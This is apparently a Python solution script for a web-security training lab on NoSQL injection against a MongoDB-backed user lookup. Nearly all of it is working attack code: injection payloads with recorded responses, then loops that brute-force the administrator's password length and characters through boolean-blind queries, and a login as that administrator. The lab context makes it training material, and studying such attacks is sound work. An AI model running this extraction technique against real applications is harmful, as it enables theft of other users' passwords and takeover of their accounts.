'''
The user lookup functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection.

To solve the lab, extract the password for the administrator user, then log in to their account.

You can log in to your own account using the following credentials: wiener:peter.
'''

import string
import requests
from bs4 import BeautifulSoup

proxies = {
    'http': '127.0.0.1:8080',
    'https': '127.0.0.1:8080'
}

url = "https://0a0d001604d039df8277560c004500ed.web-security-academy.net"

s = requests.Session()
s.proxies.update(proxies)
s.verify = False

# login with wiener:peter
r = s.get(f"{url}/login")
soup = BeautifulSoup(r.text)
csrf = soup.find('input', {'name':'csrf'})['value']

payload = {
    'csrf':csrf,
    'username':'wiener',
    'password':'peter'
}

s.post(f"{url}/login", data=payload)

# exfiltrate data via NoSQL injection
'''
1. Identify NoSQL injection
- Payload: user=wiener' && this.password.match(/[a-z]/) || 'a'=='b
- GET /user/lookup?user=wiener'+%26%26+this.password.match(/[a-z]/)+||+'a'=='b
- Expected Response: 200 - {'username': 'wiener', 'email': 'wiener@normal-user.net', 'role': 'user'}
- Response: 200 - {'username': 'wiener', 'email': 'wiener@normal-user.net', 'role': 'user'}

2. Further testing - wiener password doesn't have any digit
- Payload: user=wiener' && this.password.match(/\d/) || 'a'=='b
- GET /user/lookup?user=wiener'+%26%26+this.password.match(/\d/)+||+'a'=='b
- Expected Response: some error message due to query resulting in false
- Response: 200 - {'message': 'Could not find user'}

3. Further testing - wiener password length = 5
- GET /user/lookup?user=wiener'+%26%26+this.password.match(/^.{5}$/)+||+'a'=='b
- Expected Response: 200 - {'username': 'wiener', 'email': 'wiener@normal-user.net', 'role': 'user'}
- Response: 200 - {'username': 'wiener', 'email': 'wiener@normal-user.net', 'role': 'user'}
'''

# find length of password
for i in range(1, 100):
    payload = f"administrator' && this.password.match(/^.{{{i}}}$/) || 'a'=='b"
    params = {'user':payload}
    r = s.get(f"{url}/user/lookup", params=params)
    if 'Could not find user' not in r.json().values():
        pass_len = i
        print(pass_len)
        print(r.json())
        break

# exfiltrate admin password
admin_password = ''

for i in range(pass_len):
    for char in string.ascii_lowercase:
        payload = f"administrator' && this.password[{i}]=='{char}' || 'a'=='b"
        params = {'user':payload}
        r = s.get(f"{url}/user/lookup", params=params)
        if 'Could not find user' not in r.json().values():
            admin_password += char
            print(admin_password)
            break

print(f"credentials: administrator:{admin_password}")

# login as admin
s.get(f"{url}/logout")
r = s.get(f"{url}/login")

soup = BeautifulSoup(r.text)
csrf = soup.find('input', {'name':'csrf'})['value']

payload = {
    'csrf':csrf,
    'username':'administrator',
    'password':admin_password
}

s.post(f"{url}/login", data=payload)